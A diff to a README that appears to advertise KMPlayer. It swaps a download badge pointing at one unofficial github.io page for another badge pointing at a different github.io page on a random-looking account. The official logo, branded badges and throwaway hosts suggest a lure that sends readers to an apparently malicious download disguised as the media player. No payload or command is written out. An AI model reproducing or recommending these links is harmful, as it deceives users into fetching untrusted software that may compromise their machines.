@@ -4,10 +4,8 @@
   <img src="https://cdn.kmplayer.com/KMP/images/global/og_image.png" alt="KMPlayer Logo"/>
 </div>
 
-<div align="center">
+[![GET KMPlayer Media](https://img.shields.io/badge/GET%20%E2%80%94%20KMPlayer-Media-0078D6?style=for-the-badge&logoColor=white)](https://falconemeraldcosmiczd4nn222.github.io/.github/KMPlayer-Media)
 
-  [![Get for Windows](https://img.shields.io/badge/Get_for_Windows-blue?style=for-the-badge)](https://kraignery.github.io/.github/KMPlayer-Media-Player)
-</div>
 
 ---
 
